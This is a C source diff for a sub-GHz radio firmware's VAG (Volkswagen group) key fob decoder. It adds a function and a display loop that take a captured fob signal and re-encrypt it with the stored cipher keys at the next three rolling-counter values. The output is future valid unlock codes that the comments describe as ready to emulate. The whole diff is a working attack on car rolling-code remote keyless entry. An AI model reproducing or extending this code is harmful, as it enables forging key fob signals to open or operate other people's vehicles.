@@ -9,6 +9,9 @@
 #define VAG_ENCODER_UPLOAD_TYPE12_SIZE 635
 #define VAG_ENCODER_UPLOAD_TYPE34_SIZE 518
 #define VAG_ENCODER_UPLOAD_MAX_SIZE    VAG_ENCODER_UPLOAD_TYPE12_SIZE
+
+// Number of future rolling hops to predict/display after a good decode.
+#define VAG_PREDICT_COUNT 3U
 _Static_assert(
     VAG_ENCODER_UPLOAD_MAX_SIZE <= PP_SHARED_UPLOAD_CAPACITY,
     "VAG_ENCODER_UPLOAD_MAX_SIZE exceeds shared upload slab");
@@ -1193,6 +1196,32 @@ static bool vag_reencode_with_cnt(SubGhzProtocolEncoderVAG* instance, uint32_t c
     return true;
 }
 
+// Next-code predictor: compute the full 80-bit Key1(64)+Key2(16) frame that would be
+// transmitted for an absolute rolling counter `cnt`. The cleartext 24-bit counter lives
+// in cipher-block plaintext bytes [4..6], so re-encoding the captured serial/button with
+// cnt+i yields the exact next valid hop. This REUSES vag_reencode_with_cnt (the same
+// decrypt-splice-reencrypt path used for emulate) rather than reimplementing any crypto,
+// so predicted keys carry correct AUT64/XTEA ciphertext and are load/emulate/save-able.
+// Returns false (caller prints nothing) if the cipher key is not loaded -- a wrong "Next"
+// code is worse than none.
+static bool vag_predict_frame_for_cnt(
+    const SubGhzProtocolDecoderVAG* instance,
+    uint32_t cnt,
+    uint64_t* out_key1,
+    uint16_t* out_key2) {
+    SubGhzProtocolEncoderVAG tmp = {0};
+    tmp.key1_high = instance->key1_high;
+    tmp.key1_low = instance->key1_low;
+    tmp.key2_low = instance->key2_low;
+    tmp.key2_high = instance->key2_high;
+    tmp.vag_type = instance->vag_type;
+    tmp.key_idx = instance->key_idx;
+    if(!vag_reencode_with_cnt(&tmp, cnt)) return false;
+    *out_key1 = ((uint64_t)tmp.key1_high << 32) | tmp.key1_low;
+    *out_key2 = (uint16_t)(tmp.key2_low & 0xFFFF);
+    return true;
+}
+
 static void vag_encoder_build_type_1_2(SubGhzProtocolEncoderVAG* instance) {
     // Verbatim clone: re-emit the stored (already-encrypted) Key1/Key2 exactly as
     // the decoder framed them, so re-decoding recovers the same key -> the same
@@ -1380,6 +1409,27 @@ void subghz_protocol_decoder_vag_get_string(void* context, FuriString* output) {
             vag_button_name(instance->btn),
             (unsigned long)instance->serial,
             (unsigned long)instance->cnt);
+
+#ifdef ENABLE_EMULATE_FEATURE
+        // Cleartext 24-bit rolling counter inside the cipher block: predict the next few
+        // hops by re-encoding the captured serial/button with cnt+i. Reuses the emulate
+        // encoder so each predicted Key1/Key2 carries valid ciphertext (load/emulate/save-
+        // able). Only runs on a good decode (serial/cnt populated above); prints nothing
+        // for a Type/key whose cipher key is not loaded.
+        for(uint16_t i = 1; i <= VAG_PREDICT_COUNT; i++) {
+            uint32_t cnt_next = (instance->cnt + i) & 0xFFFFFF;
+            uint64_t next_key1 = 0;
+            uint16_t next_key2 = 0;
+            if(vag_predict_frame_for_cnt(instance, cnt_next, &next_key1, &next_key2)) {
+                furi_string_cat_printf(
+                    output,
+                    "\r\nNext+%u:%016llX%04X",
+                    (unsigned int)i,
+                    (unsigned long long)next_key1,
+                    next_key2);
+            }
+        }
+#endif
     } else {
         furi_string_cat_printf(
             output,
